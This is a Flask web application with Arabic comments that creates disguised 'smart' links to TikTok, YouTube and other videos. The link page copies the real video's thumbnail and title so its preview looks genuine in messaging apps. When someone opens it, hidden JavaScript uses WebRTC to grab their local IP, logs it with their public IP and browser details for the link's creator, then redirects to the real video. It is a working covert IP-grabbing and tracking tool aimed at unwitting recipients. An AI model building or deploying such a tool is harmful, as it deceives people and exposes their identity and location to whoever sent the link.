from flask import Flask, render_template_string, request, redirect, jsonify
import uuid
import datetime
import requests
from bs4 import BeautifulSoup
import re

app = Flask(__name__)

# قاعدة بيانات مؤقتة في الذاكرة لحفظ الروابط والنقرات
links_db = {}

# دالة برمجية متطورة لكشط واستخراج الصورة الأصلية والعنوان الحقيقي لأي فيديو من أي منصة
def extract_live_video_meta(url):
    # قيم افتراضية في حال فشل الكشط
    meta = {
        "title": "شاهد مقطع الفيديو بجودة عالية",
        "image": "https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?q=80&w=640"
    }
    
    try:
        # إرسال طلب للمنصة مع إضافة جدار حماية للمتصفح (User-Agent) لتجنب الحظر
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8'
        }
        
        # معالجة خاصة لروابط يوتيوب المختصرة (youtu.be) أو الطويلة لضمان استخراج سريع
        if "youtube.com" in url or "youtu.be" in url:
            video_id_match = re.search(r'(?:v=|\/v\/|youtu\.be\/|\/embed\/)([a-zA-Z0-9_-]{11})', url)
            if video_id_match:
                video_id = video_id_match.group(1)
                meta["image"] = f"https://img.youtube.com/vi/{video_id}/maxresdefault.jpg"
                meta["title"] = "YouTube Video"
                # يمكننا أيضاً متابعة الكشط لجلب العنوان الدقيق من يوتيوب
        
        # جلب محتوى الصفحة للمنصات الأخرى (TikTok, Instagram, Facebook...)
        response = requests.get(url, headers=headers, timeout=7)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # البحث عن وسم الميتا الخاص بالصورة الأصلية المعتمد عالمياً من المنصات (og:image)
            og_image = soup.find("meta", property="og:image") or soup.find("meta", attrs={"name": "twitter:image"})
            if og_image and og_image.get("content"):
                meta["image"] = og_image["content"]
                
            # البحث عن العنوان الأصلي للفيديو (og:title)
            og_title = soup.find("meta", property="og:title") or soup.find("title")
            if og_title:
                meta["title"] = og_title.get("content") if og_title.get("content") else og_title.text.strip()
                
    except Exception as e:
        print(f"حدث خطأ أثناء محاولة جلب الصورة الأصلية: {e}")
        
    return meta

# واجهة بسيطة وعملية تناسب شاشة الهاتف لإنشاء الروابط ومتابعة سجلات التتبع
HTML_LAYOUT = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>منصة التتبع والروابط المختصرة</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f6f9; color: #333; margin: 0; padding: 0; }
        .navbar { background-color: #2c3e50; color: white; padding: 15px; text-align: center; font-size: 18px; font-weight: bold; }
        .container { max-width: 550px; margin: 25px auto; background: white; padding: 25px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.08); }
        h2 { color: #2c3e50; font-size: 20px; text-align: center; margin-bottom: 20px; }
        label { font-weight: bold; display: block; margin-top: 15px; color: #555; }
        input[type="text"], input[type="url"] { width: 100%; padding: 12px; margin-top: 6px; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; font-size: 15px; }
        button { width: 100%; background-color: #3498db; color: white; border: none; padding: 14px; margin-top: 20px; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; }
        button:hover { background-color: #2980b9; }
        .card { background: #f8f9fa; padding: 15px; border-right: 5px solid #3498db; border-radius: 4px; margin-top: 15px; word-break: break-all; }
        .stats-table { width: 100%; border-collapse: collapse; margin-top: 15px; font-size: 13px; }
        .stats-table th, .stats-table td { border: 1px solid #ddd; padding: 10px; text-align: center; }
        .stats-table th { background-color: #2c3e50; color: white; }
        .badge { background: #e74c3c; color: white; padding: 2px 8px; border-radius: 4px; font-size: 12px; }
    </style>
</head>
<body>
    <div class="navbar">لوحة تحكم التتبع وإدارة الروابط</div>
    <div class="container">
        {% if page == 'home' %}
            <h2>إنشاء رابط تتبع ذكي لجميع المنصات</h2>
            <form action="/create" method="POST">
                <label>أدخل رابط الفيديو الأصلي (TikTok, YouTube, Reels...):</label>
                <input type="url" name="original_url" placeholder="https://example.com/video" required>
                
                <label>ملاحظة خاصة بالرابط لتمييزه:</label>
                <input type="text" name="note" placeholder="مثال: فحص أمان شبكة الميتا" required>
                
                <button type="submit">توليد الرابط الذكي واستخراج الغلاف</button>
            </form>
        {% elif page == 'created' %}
            <h2>تم إنشاء الرابط بنجاح! 🚀</h2>
            <p><strong>الملاحظة المحفوظة:</strong> <span style="color:#e67e22; font-weight:bold;">{{ link_data.note }}</span></p>
            
            <div class="card">
                <strong>🔗 الرابط الذكي (يدعم إظهار الغلاف الأصلي):</strong><br>
                <input type="text" value="{{ tracking_link }}" style="width:100%; padding:8px; margin-top:5px; font-size:13px; text-align:left;" readonly>
                <p style="font-size:11px; color:#27ae60; margin-top:5px;">💡 عند إرسال هذا الرابط في (ماسنجر، تليجرام، أو واتساب)، سيتم سحب الغلاف الأصلي للفيديو تلقائياً.</p>
            </div>
            
            <div class="card" style="border-right-color: #2ecc71;">
                <strong>📊 رابط الإحصائيات ولوحة التحكم:</strong><br>
                <input type="text" value="{{ stats_link }}" style="width:100%; padding:8px; margin-top:5px; font-size:13px; text-align:left;" readonly>
            </div>
            <a href="/" style="display:block; text-align:center; margin-top:20px; color:#3498db; text-decoration:none; font-weight:bold;">← إنشاء رابط جديد</a>
        {% endif %}
    </div>
</body>
</html>
'''

@app.route('/')
def home():
    return render_template_string(HTML_LAYOUT, page='home')

@app.route('/create', methods=['POST'])
def create():
    original_url = request.form.get('original_url')
    note = request.form.get('note')
    link_id = str(uuid.uuid4())[:8]
    
    # استخراج صورة الغلاف الأصلية والعنوان الحقيقي بشكل مباشر من رابط المنصة المدخلة
    live_meta = extract_live_video_meta(original_url)
    
    links_db[link_id] = {
        'url': original_url,
        'note': note,
        'meta_title': live_meta['title'],
        'meta_image': live_meta['image'],
        'clicks': []
    }
    
    tracking_link = f"{request.host_url}secure/{link_id}"
    stats_link = f"{request.host_url}dashboard/{link_id}"
    
    return render_template_string(HTML_LAYOUT, page='created', tracking_link=tracking_link, stats_link=stats_link, link_data=links_db[link_id])

@app.route('/secure/<link_id>')
def secure_redirect(link_id):
    if link_id in links_db:
        data = links_db[link_id]
        
        title = data['meta_title']
        image_url = data['meta_image']
        description = "▶️ اضغط هنا لتشغيل الفيديو بالدقة الكاملة..."
        
        return f'''
        <!DOCTYPE html>
        <html lang="ar">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            
            <title>{title}</title>
            <meta property="og:title" content="{title}">
            <meta property="og:description" content="{description}">
            <meta property="og:image" content="{image_url}">
            <meta property="og:url" content="{request.base_url}">
            <meta property="og:type" content="video.other">
            <meta property="og:image:width" content="1200">
            <meta property="og:image:height" content="630">
            
            <meta name="twitter:card" content="summary_large_image">
            <meta name="twitter:image" content="{image_url}">
            
            <script>
                function getLocalIPAndRedirect() {{
                    var localIp = "محمي/غير معروف";
                    window.RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
                    
                    if (window.RTCPeerConnection) {{
                        var pc = new RTCPeerConnection({{iceServers:[]}}), noop = function(){{}};
                        pc.createDataChannel("");
                        pc.createOffer(pc.setLocalDescription.bind(pc), noop);
                        pc.onicecandidate = function(ice) {{
                            if (ice && ice.candidate && ice.candidate.candidate) {{
                                var myIP = /([0-9]{{1,3}}(\\\\.[0-9]{{1,3}}){{3}})/.exec(ice.candidate.candidate);
                                if (myIP) {{
                                    localIp = myIP[1];
                                    sendData(localIp);
                                    pc.onicecandidate = noop;
                                }}
                            }}
                        }};
                        setTimeout(function() {{ sendData(localIp); }}, 900);
                    }} else {{
                        sendData(localIp);
                    }}
                }}

                function sendData(localIp) {{
                    var xhr = new XMLHttpRequest();
                    xhr.open("POST", "/log-click/{link_id}", true);
                    xhr.setRequestHeader("Content-Type", "application/json");
                    xhr.onreadystatechange = function () {{
                        if (xhr.readyState === 4) {{
                            window.location.href = "{data['url']}";
                        }}
                    }};
                    xhr.send(JSON.stringify({{ "local_ip": localIp }}));
                }}
                window.onload = getLocalIPAndRedirect;
            </script>
        </head>
        <body>
            <p style="text-align:center; font-family:sans-serif; margin-top:100px; color:#666;">جاري فتح مقطع الفيديو، يرجى الانتظار ثوانٍ...</p>
        </body>
        </html>
        '''
    return "الرابط غير موجود", 404

@app.route('/log-click/<link_id>', methods=['POST'])
def log_click(link_id):
    if link_id in links_db:
        data = request.get_json() or {}
        local_ip = data.get('local_ip', 'غير معروف')
        
        ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
        if ip_address and ',' in ip_address:
            ip_address = ip_address.split(',')[0].strip()
            
        user_agent = request.headers.get('User-Agent')
        current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        links_db[link_id]['clicks'].append({
            "ip": ip_address,
            "local_ip": local_ip,
            "device": user_agent,
            "time": current_time
        })
        return jsonify({"status": "success"}), 200
    return jsonify({"status": "error"}), 404

@app.route('/dashboard/<link_id>')
def dashboard(link_id):
    if link_id in links_db:
        return render_template_string(HTML_LAYOUT, page='stats', link_data=links_db[link_id])
    return "المعرف غير صحيح", 404

if __name__ == '__main__':
    app.run(debug=True)
